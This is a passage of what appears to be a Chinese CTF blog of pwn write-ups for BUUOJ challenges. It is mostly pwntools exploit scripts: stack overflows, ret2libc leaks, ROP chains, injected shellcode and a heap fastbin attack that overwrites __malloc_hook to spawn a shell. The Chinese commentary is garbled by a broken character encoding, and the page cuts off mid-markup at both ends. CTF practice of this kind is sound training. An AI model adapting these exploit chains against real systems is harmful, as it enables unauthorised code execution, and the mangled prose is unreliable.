class="hljs-string">&#x27;exit&#x27;</span>])+p32(flag)<br>r.sendline(payload)<br>r.interactive()<br></code></pre></td></tr></table></figure><p>å¦ä¸€ç§è§£æ³•å°±æ˜¯ç”¨mprotectææƒï¼Œå†™shellcodeåˆ°.bssæ®µï¼Œæ²¡è¯•è¿‡</p><h3 id="bjdctf-2020-babystack">bjdctf_2020_babystack</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*<br>r=remote(<span class="hljs-string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="hljs-number">28514</span>)<br>r.sendlineafter(<span class="hljs-string">&#x27;name:\n&#x27;</span>,<span class="hljs-string">&#x27;30&#x27;</span>)<br>r.sendline(<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x18</span>+p64(<span class="hljs-number">0x4006E6</span>))<br>r.interactive()<br></code></pre></td></tr></table></figure><h3 id="HarekazeCTF2019-baby-rop">[HarekazeCTF2019]baby_rop</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*<br>r=remote(<span class="hljs-string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="hljs-number">28521</span>)<br>binsh=<span class="hljs-number">0x601048</span><br>pop_rdi=<span class="hljs-number">0x0400683</span><br>sys=<span class="hljs-number">0x400490</span><br>r.sendline(<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x18</span>+p64(pop_rdi)+p64(binsh)+p64(sys))<br>r.interactive()<br></code></pre></td></tr></table></figure><h3 id="jarvisoj-level2-x64">jarvisoj_level2_x64</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*<br>r=remote(<span class="hljs-string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="hljs-number">26124</span>)<br>binsh=<span class="hljs-number">0x600A90</span><br>pop_rdi=<span class="hljs-number">0x4006b3</span><br>sys=<span class="hljs-number">0x4004C0</span><br>r.sendline(<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x88</span>+p64(pop_rdi)+p64(binsh)+p64(sys))<br>r.interactive()<br></code></pre></td></tr></table></figure><h3 id="ciscn-2019-n-5">ciscn_2019_n_5</h3><p>#idaçœ‹getsæ˜¯ä¸¤ä¸ªå‚æ•°ï¼Œä½†å®é™…å†™å…¥è²Œä¼¼æ˜¯ç¬¬ä¸€ä¸ªå‚æ•°</p><p>#æ²¡å¼€nxï¼Œcanaryç¬¬ä¸€æ¬¡å†™shåˆ°bssï¼Œç¬¬äºŒæ¬¡æ ˆæº¢å‡ºè·³bssæ®µ</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*<br>r=remote(<span class="hljs-string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="hljs-number">27640</span>)<br>context.arch=<span class="hljs-string">&#x27;amd64&#x27;</span><br>sh=asm(shellcraft.sh())<br>r.sendline(sh)<br>r.sendline(<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x28</span>+p64(<span class="hljs-number">0x601080</span>))<br>r.interactive()<br></code></pre></td></tr></table></figure><h3 id="é“äººä¸‰é¡¹-ç¬¬äº”èµ›åŒº-2018-rop">é“äººä¸‰é¡¹(ç¬¬äº”èµ›åŒº)_2018_rop</h3><p>#æ ‡å‡†çš„ret2libc</p><p>#ç½‘ä¸Šæœ‰ç”¨writeå†™åˆ°bssï¼Œç›¸å¯¹éº»çƒ¦äº†ç‚¹</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*<br>r=remote(<span class="hljs-string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="hljs-number">27790</span>)<br>elf=ELF(<span class="hljs-string">&#x27;./2018_rop&#x27;</span>)<br>libc=ELF(<span class="hljs-string">&#x27;./libc-2.27.so&#x27;</span>)<br>payload=<span class="hljs-string">&#x27;a&#x27;</span>\*<span class="hljs-number">0x88</span>+<span class="hljs-string">&#x27;bbbb&#x27;</span>+p32(elf.sym[<span class="hljs-string">&#x27;write&#x27;</span>])+p32(elf.sym[<span class="hljs-string">&#x27;main&#x27;</span>])<br>payload+=p32(<span class="hljs-number">1</span>)+p32(elf.got[<span class="hljs-string">&#x27;write&#x27;</span>])+p32(<span class="hljs-number">4</span>)<br>r.sendline(payload)<br>true=u32(r.recv(<span class="hljs-number">4</span>))<br>base=true-libc.sym[<span class="hljs-string">&#x27;write&#x27;</span>]<br>system=base+libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]<br>binsh=base+<span class="hljs-number">0x17b8cf</span><br>r.sendline(<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x88</span>+<span class="hljs-string">&#x27;bbbb&#x27;</span>+p32(<span class="hljs-number">0x08048323</span>)+p32(system)+p32(<span class="hljs-number">0</span>)+p32(binsh))<br>r.interactive()<br></code></pre></td></tr></table></figure><h3 id="bjdctf-2020-babyrop">bjdctf_2020_babyrop</h3><p>ä¹Ÿæ˜¯ret2libc</p><p>ç‰¹åˆ«æ³¨æ„æ¥å—æ‰“å°å‡ºæ¥çš„çœŸå®åœ°å€æ—¶æ ¼å¼åº”è¯¥æ€ä¹ˆæ¥</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*<br>r=remote(<span class="hljs-string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="hljs-number">29945</span>)<br>elf=ELF(<span class="hljs-string">&#x27;./bjdctf_2020_babyrop&#x27;</span>)<br>libc=ELF(<span class="hljs-string">&#x27;./libc-2.23.so&#x27;</span>)<br>pop_rdi=<span class="hljs-number">0x0000000000400733</span><br>payload=<span class="hljs-string">&#x27;a&#x27;</span>\*<span class="hljs-number">0x28</span>+p64(pop_rdi)+p64(elf.got[<span class="hljs-string">&#x27;puts&#x27;</span>])+p64(elf.sym[<span class="hljs-string">&#x27;puts&#x27;</span>])+p64(elf.sym[<span class="hljs-string">&#x27;main&#x27;</span>])<br>r.sendline(payload)<br>r.recvuntil(<span class="hljs-string">&#x27;story!\n&#x27;</span>)<br>true=u64(r.recvuntil(<span class="hljs-string">&#x27;\n&#x27;</span>)[:-<span class="hljs-number">1</span>].ljust(<span class="hljs-number">8</span>,<span class="hljs-string">&#x27;\0&#x27;</span>))<br>base=true-libc.sym[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>system=base+libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]<br>binsh=base+<span class="hljs-number">0x18cd57</span><br>payload=<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x28</span>+p64(pop_rdi)+p64(binsh)+p64(system)<br>r.sendline(payload)<br>r.interactive()<br></code></pre></td></tr></table></figure><h3 id="ciscn-2019-s-3">ciscn_2019_s_3</h3><p>è¿™é¢˜æ„Ÿè§‰å¥½éš¾= =</p><p>#ç”¨59å·ç³»ç»Ÿè°ƒç”¨æ˜¯execveé‚£ä¹ˆå°±å¯ä»¥æƒ³åŠæ³•æ§åˆ¶å¯„å­˜å™¨çš„å€¼è°ƒç”¨execve(â€œ/bin/shâ€,0,0)ï¼Œæ³¨æ„åœ¨è°ƒç”¨execveæ—¶ï¼Œåé¢ä¸¤ä¸ªå‚æ•°éœ€è¦ç½®0ï¼Œç”±äºéœ€è¦æ§åˆ¶rdxçš„å€¼ï¼Œæ‰€ä»¥é€‰æ‹©ä½¿ç”¨é€šç”¨gadget-__libc_csu_initã€‚</p><p>#å‰é¢éƒ¨åˆ†éƒ½æ˜¯ä¸€æ ·çš„ï¼Œåé¢æ”¹æˆropå»å¼€shell</p><p>#r13çš„å€¼ä¼šç»™åˆ°rdxï¼›è®©rbx=0ï¼Œä¸‹é¢callçš„æ—¶å€™ä¼šå˜ä¸ºcall [r12]ï¼Œä¼šå»call r12æŒ‡å‘ä½ç½®çš„ä»£ç ï¼›æˆ‘ä»¬å¯ä»¥è°ƒåˆ°åé¢çš„ropæ‰§è¡Œ</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>io=remote(<span class="hljs-string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="hljs-number">27416</span>)<br>main=<span class="hljs-number">0x0004004ED</span><br>execv=<span class="hljs-number">0x04004E2</span><br>pop_rdi=<span class="hljs-number">0x4005a3</span><br>pop_rbx_rbp_r12_r13_r14_r15=<span class="hljs-number">0x40059A</span><br>mov_rdxr13_call=<span class="hljs-number">0x0400580</span> <br>sys=<span class="hljs-number">0x00400517</span><br>pl1=<span class="hljs-string">&#x27;/bin/sh\x00&#x27;</span>+<span class="hljs-string">&#x27;a&#x27;</span>\*<span class="hljs-number">8</span>+p64(main)<br>io.send(pl1)<br>io.recv(<span class="hljs-number">0x20</span>)<br>sh=u64(io.recv(<span class="hljs-number">8</span>))-<span class="hljs-number">280</span><br>pl2=<span class="hljs-string">&#x27;/bin/sh\x00&#x27;</span>+<span class="hljs-string">&#x27;a&#x27;</span>\*<span class="hljs-number">8</span>+p64(pop_rbx_rbp_r12_r13_r14_r15)+p64(<span class="hljs-number">0</span>)\*<span class="hljs-number">2</span>+p64(sh+<span class="hljs-number">0x50</span>)+p64(<span class="hljs-number">0</span>)*<span class="hljs-number">3</span><br>pl2+=p64(mov_rdxr13_call)+p64(execv)<br>pl2+=p64(pop_rdi)+p64(sh)+p64(sys)<br>io.send(pl2)<br>io.interactive()<br></code></pre></td></tr></table></figure><h3 id="others-shellcode">others_shellcode</h3><p>ç›´æ¥ncè¿ä¸€ä¸‹ï¼Œcat flagå°±è¡Œ</p><h3 id="HarekazeCTF2019-baby-rop2">[HarekazeCTF2019]baby_rop2</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#è¿™é¢˜å°±æ˜¯ç”¨printfå‡½æ•°æ—¶ï¼Œè¦æœ‰ä¸ªå½¢å¼å‚æ•°%sï¼Œ</span><br><br><span class="hljs-comment">#è¿˜æœ‰å°±æ˜¯æ¥æ”¶å€¼çš„æ—¶å€™ï¼Œæ¥æ”¶çš„åœ°å€ä¸­é—´çš„æŸä¸ªå­—èŠ‚ä¸º0ï¼Œprintfè¾“å‡ºçš„å°±æ˜¯ä¸å®Œæ•´çš„åœ°å€ï¼Œä¼šå¯¼è‡´é”™è¯¯</span><br><br><span class="hljs-comment">#å‰©ä¸‹çš„å°±æ˜¯æ ‡å‡†ret2libc</span><br><br>pop_rdi=<span class="hljs-number">0x0000000000400733</span> <span class="hljs-comment"># pop rdi ; ret</span><br>pop_rsi_r15 = <span class="hljs-number">0x0000000000400731</span><br>format_str = <span class="hljs-number">0x0000000000400770</span><br><br>payload=<span class="hljs-string">&#x27;a&#x27;</span>\*<span class="hljs-number">0x28</span>+p64(pop_rdi)+p64(format_str)+p64(pop_rsi_r15)+p64(elf.got[<span class="hljs-string">&#x27;read&#x27;</span>])+p64(<span class="hljs-number">0</span>)+p64(elf.plt[<span class="hljs-string">&#x27;printf&#x27;</span>])+p64(elf.sym[<span class="hljs-string">&#x27;main&#x27;</span>])<br>r.recvuntil(<span class="hljs-string">&#x27;name? &#x27;</span>)<br>r.sendline(payload)<br>true=u64(r.recvuntil(<span class="hljs-string">&#x27;\x7f&#x27;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>, <span class="hljs-string">&#x27;\x00&#x27;</span>))<br><span class="hljs-built_in">print</span> <span class="hljs-built_in">hex</span>(true)<br>binsh=<span class="hljs-number">0x18cd57</span><br>base=true-libc.sym[<span class="hljs-string">&#x27;read&#x27;</span>]<br>system=base+libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]<br><span class="hljs-built_in">print</span> <span class="hljs-built_in">hex</span>(base)<br>pd2=<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x28</span>+p64(pop_rdi)+p64(binsh+base)+p64(system)<br>r.sendline(pd2)<br>r.interactive()<br></code></pre></td></tr></table></figure><p>4.ez_pz_hackover_2016</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#è¿™é¢˜ç›´æ¥å‘Šè¯‰äº†æ ˆçš„åœ°å€ï¼Œè¿˜æ²¡å¼€nx</span><br><br><span class="hljs-comment">#è¦æ‰¾åˆ°è¾“å…¥çš„æ•°æ®åœ¨æ ˆä¸­çš„åç§»</span><br><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*<br>r=remote(<span class="hljs-string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="hljs-number">25044</span>)<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>r.recvuntil(<span class="hljs-string">&#x27;crash: &#x27;</span>)<br>stack_addr = <span class="hljs-built_in">int</span>(r.recv(<span class="hljs-number">10</span>), <span class="hljs-number">16</span>)<br>r.recvuntil(<span class="hljs-string">&#x27;&gt; &#x27;</span>)<br>payload = <span class="hljs-string">&#x27;crashme\x00&#x27;</span> <br>payload = payload.ljust(<span class="hljs-number">26</span>, <span class="hljs-string">&#x27;\x00&#x27;</span>)<br>payload += p32(stack_addr-<span class="hljs-number">0x1C</span>)<br>payload += asm(shellcraft.sh())<br>r.sendline(payload)<br>r.interactive()<br></code></pre></td></tr></table></figure><h3 id="Black-Watch-å…¥ç¾¤é¢˜-PWN">[Black Watch å…¥ç¾¤é¢˜]PWN</h3><p>æ ˆè¿ç§»</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*<br>r=remote(<span class="hljs-string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="hljs-number">26380</span>)<br>libc=ELF(<span class="hljs-string">&#x27;./libc-2.23.so&#x27;</span>)<br>elf=ELF(<span class="hljs-string">&#x27;./spwn&#x27;</span>)<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>context.arch = elf.arch<br>pd1=<span class="hljs-string">&#x27;aaaa&#x27;</span>+p32(elf.sym[<span class="hljs-string">&#x27;write&#x27;</span>])+p32(elf.sym[<span class="hljs-string">&#x27;main&#x27;</span>])<br>pd1+=p32(<span class="hljs-number">1</span>)+p32(elf.got[<span class="hljs-string">&#x27;write&#x27;</span>])+p32(<span class="hljs-number">4</span>)<br>r.send(pd1)<br>r.send(<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x18</span>+p32(<span class="hljs-number">0x0804A300</span>)+p32(<span class="hljs-number">0x08048408</span>))<br>r.recvuntil(<span class="hljs-string">&#x27;say?&#x27;</span>)<br>true=<span class="hljs-built_in">int</span>(u32(r.recv(<span class="hljs-number">4</span>)))<br>base=true-<span class="hljs-number">0xd43c0</span><br><span class="hljs-built_in">print</span> <span class="hljs-built_in">hex</span>(true)<br><span class="hljs-built_in">print</span> <span class="hljs-built_in">hex</span>(base)<br>binsh=<span class="hljs-number">0x15902b</span><br>system=<span class="hljs-number">0x0003a940</span><br>pd2=<span class="hljs-string">&#x27;aaaa&#x27;</span>+p32(base+system)+p32(<span class="hljs-number">0</span>)+p32(binsh+base)<br>r.recvuntil(<span class="hljs-string">&#x27;name?&#x27;</span>)<br>r.send(pd2)<br>r.recvuntil(<span class="hljs-string">&#x27;say?&#x27;</span>)<br>r.send(<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x18</span>+p32(<span class="hljs-number">0x0804A300</span>)+p32(<span class="hljs-number">0x08048408</span>))<br>r.interactive()<br><br></code></pre></td></tr></table></figure><h2 id="å¤§ä¸€ä¸‹">å¤§ä¸€ä¸‹</h2><h3 id="babyheap-0ctf-2017">babyheap_0ctf_2017</h3><p>æ€è·¯ï¼š</p><p>1.è¿ç”¨å †æº¢å‡ºï¼Œä¼ªé€ ä¸€ä¸ªåŒ…å«index1ï¼Œ2å¤§å°çš„åœ¨unsortbinå¤§å°èŒƒå›´çš„å—ï¼Œfreeåˆ°unsortbinï¼Œç„¶åç”³è¯·å…¶åŸæ¥index1å¤§å°çš„å—ï¼Œmain_arenaé™„è¿‘çš„åœ°å€å°±ä¼šä¸‹ç§»åˆ°index2çš„å—ï¼Œåœ°å€å°±èƒ½è¢«dumpå‡ºæ¥ã€‚æ³„éœ²äº†main_arenaé™„è¿‘çš„åœ°å€</p><p>2.libcåŸºå€=main_arenaé™„è¿‘çš„åœ°å€-å¯¹åº”åç§»-0x10</p><p>malloc_hook=libcåŸºå€+libc.sym[â€˜__malloc_hookâ€™]</p><p>â€‹shell=libcåŸºå€+one_gadget</p><p>3.ç”¨å †æº¢å‡ºä¿®æ”¹freeçš„fastbinå—ï¼Œåœ¨fastbinä¸­åˆ¶é€ è™šå‡çš„é“¾æŒ‡å‘malloc_hook-0x23å¤„</p><p>å†åˆ†é…ä¸¤æ¬¡0x60çš„å—ï¼Œç¬¬äºŒæ¬¡å°±åˆ†é…åœ¨malloc_hook-0x23å¤„</p><p>â€‹åœ¨è¿™ä¸ªå—ä¸Šå¡«å…¥shell</p><p>â€‹ï¼ˆä»»æ„åœ°å€å†™å…¥ä»»æ„å€¼ï¼‰</p><p>æœ€åallocå¸¦åŠ¨malloc,mallocè§¦å‘malloc_hookï¼Œhookå¸¦åŠ¨shell</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-comment">#from LibcSearcher import * </span><br>local_file  = <span class="hljs-string">&#x27;./babyheap_0ctf_2017&#x27;</span><br>local_libc  = <span class="hljs-string">&#x27;./libc-2.23.so&#x27;</span><br><span class="hljs-comment">#remote_libc = &#x27;/home/glibc-all-in-one/libs/2.23/libc-2.23.so&#x27;</span><br>remote_libc = <span class="hljs-string">&#x27;./libc-2.23.so&#x27;</span><br>select = <span class="hljs-number">1</span><br><span class="hljs-keyword">if</span> select == <span class="hljs-number">0</span>:<br>    r = process(local_file)<br>    libc = ELF(local_libc)<br><span class="hljs-keyword">else</span>:<br>    r = remote(<span class="hljs-string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="hljs-number">25542</span> )<br>    libc = ELF(remote_libc)<br>elf = ELF(local_file)<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>context.arch = elf.arch<br>se      = <span class="hljs-keyword">lambda</span> data               :r.send(data)<br>sa      = <span class="hljs-keyword">lambda</span> delim,data         :r.sendafter(delim, data)<br>sl      = <span class="hljs-keyword">lambda</span> data               :r.sendline(data)<br>sla     = <span class="hljs-keyword">lambda</span> delim,data         :r.sendlineafter(delim, data)<br>sea     = <span class="hljs-keyword">lambda</span> delim,data         :r.sendafter(delim, data)<br>rc      = <span class="hljs-keyword">lambda</span> numb=<span class="hljs-number">4096</span>          :r.recv(numb)<br>rl      = <span class="hljs-keyword">lambda</span>                    :r.recvline()<br>ru      = <span class="hljs-keyword">lambda</span> delims                         :r.recvuntil(delims)<br>uu32    = <span class="hljs-keyword">lambda</span> data               :u32(data.ljust(<span class="hljs-number">4</span>, <span class="hljs-string">&#x27;\0&#x27;</span>))<br>uu64    = <span class="hljs-keyword">lambda</span> data               :u64(data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">&#x27;\0&#x27;</span>))<br>info    = <span class="hljs-keyword">lambda</span> tag, addr        :r.info(tag + <span class="hljs-string">&#x27;: &#123;:#x&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(addr))<br>o_g_32_old = [<span class="hljs-number">0x3ac3c</span>, <span class="hljs-number">0x3ac3e</span>, <span class="hljs-number">0x3ac42</span>, <span class="hljs-number">0x3ac49</span>, <span class="hljs-number">0x5faa5</span>, <span class="hljs-number">0x5faa6</span>]<br>o_g_32 = [<span class="hljs-number">0x3ac6c</span>, <span class="hljs-number">0x3ac6e</span>, <span class="hljs-number">0x3ac72</span>, <span class="hljs-number">0x3ac79</span>, <span class="hljs-number">0x5fbd5</span>, <span class="hljs-number">0x5fbd6</span>]<br>o_g_old = [<span class="hljs-number">0x45216</span>,<span class="hljs-number">0x4526a</span>,<span class="hljs-number">0xf02a4</span>,<span class="hljs-number">0xf1147</span>]<br>o_g = [<span class="hljs-number">0x45226</span>, <span class="hljs-number">0x4527a</span>, <span class="hljs-number">0xf0364</span>, <span class="hljs-number">0xf1207</span>]<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">debug</span>(<span class="hljs-params">cmd=<span class="hljs-string">&#x27;&#x27;</span></span>):<br>     gdb.attach(r,cmd)<br><span class="hljs-comment">#------------------------------------------------------</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">alloc</span>(<span class="hljs-params">size</span>):<br>     sla(<span class="hljs-string">&#x27;Command: &#x27;</span>,<span class="hljs-string">&#x27;1&#x27;</span>)<br>     sla(<span class="hljs-string">&#x27;Size: &#x27;</span>,<span class="hljs-built_in">str</span>(size))<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">fill</span>(<span class="hljs-params">index,content</span>):<br>     sla(<span class="hljs-string">&#x27;Command: &#x27;</span>,<span class="hljs-string">&#x27;2&#x27;</span>)<br>     sla(<span class="hljs-string">&#x27;Index: &#x27;</span>,<span class="hljs-built_in">str</span>(index))<br>     sla(<span class="hljs-string">&#x27;Size: &#x27;</span>,<span class="hljs-built_in">str</span>(<span class="hljs-built_in">len</span>(content)))<br>     sla(<span class="hljs-string">&#x27;Content: &#x27;</span>,content)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">free</span>(<span class="hljs-params">index</span>):<br>     sla(<span class="hljs-string">&#x27;Command: &#x27;</span>,<span class="hljs-string">&#x27;3&#x27;</span>)<br>     sla(<span class="hljs-string">&#x27;Index: &#x27;</span>,<span class="hljs-built_in">str</span>(index))<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">dump</span>(<span class="hljs-params">index</span>):<br>     sla(<span class="hljs-string">&#x27;Command: &#x27;</span>,<span class="hljs-string">&#x27;4&#x27;</span>)<br>     sla(<span class="hljs-string">&#x27;Index: &#x27;</span>,<span class="hljs-built_in">str</span>(index))<br><span class="hljs-comment">#-------------------------------------------------------</span><br><br>alloc(<span class="hljs-number">0x10</span>) <br>alloc(<span class="hljs-number">0x60</span>) <br>alloc(<span class="hljs-number">0x10</span>) <br>alloc(<span class="hljs-number">0x10</span>) <br>fill(<span class="hljs-number">0</span>,p64(<span class="hljs-number">0</span>)*<span class="hljs-number">3</span>+p64(<span class="hljs-number">0x91</span>)) <br>free(<span class="hljs-number">1</span>) <br>alloc(<span class="hljs-number">0x60</span>) <br>dump(<span class="hljs-number">2</span>) <br>addr=uu64(ru(<span class="hljs-string">&#x27;\x7f&#x27;</span>)[-<span class="hljs-number">6</span>:]) <br><span class="hljs-built_in">print</span> <span class="hljs-built_in">hex</span>(addr) <br>libc_base=addr-<span class="hljs-number">88</span>-libc.sym[<span class="hljs-string">&#x27;__malloc_hook&#x27;</span>]-<span class="hljs-number">0x10</span> <br><span class="hljs-built_in">print</span> <span class="hljs-built_in">hex</span>(libc_base) <br>hook=libc_base+libc.sym[<span class="hljs-string">&#x27;__malloc_hook&#x27;</span>] <br>shell=libc_base+o_g_old[<span class="hljs-number">1</span>] <br><span class="hljs-comment">#------------------------------------------------------- </span><br>free(<span class="hljs-number">1</span>) <br>fill(<span class="hljs-number">0</span>,p64(<span class="hljs-number">0</span>)*<span class="hljs-number">3</span>+p64(<span class="hljs-number">0x71</span>)+p64(hook-<span class="hljs-number">0x23</span>)) <br>alloc(<span class="hljs-number">0x60</span>) <br>alloc(<span class="hljs-number">0x60</span>) <br>fill(<span class="hljs-number">4</span>,p8(<span class="hljs-number">0</span>)*<span class="hljs-number">3</span>+p64(<span class="hljs-number">0</span>)*<span class="hljs-number">2</span>+p64(shell)) <br>alloc(<span class="hljs-number">0x20</span>) <br><span class="hljs-comment">#gdb.attach(r) </span><br>r.interactive()<br></code></pre></td></tr></table></figure><p>chunkå¤§å°60å¥½åƒä¹Ÿè¦å›ºå®š</p><p>hook-0x23ï¼Œé¦–å…ˆèµ·ç è¦-0x10ï¼Œå…¶æ¬¡æœ€è¿‘çš„7få°±æ˜¯å†-0x13å¤„äº†</p><h3 id="pwn2-sctf-2016">pwn2_sctf_2016</h3><p>æ€è·¯ï¼šè¿™é‡Œåˆ©ç”¨äº†æœ‰ç¬¦å·è´Ÿæ•°ï¼Œè½¬æ— ç¬¦å·æ•°ï¼Œå˜æˆæå¤§å€¼ï¼Œç»•è¿‡å¤§å°æ£€æµ‹</p><p>ç„¶åreturn2libc</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span 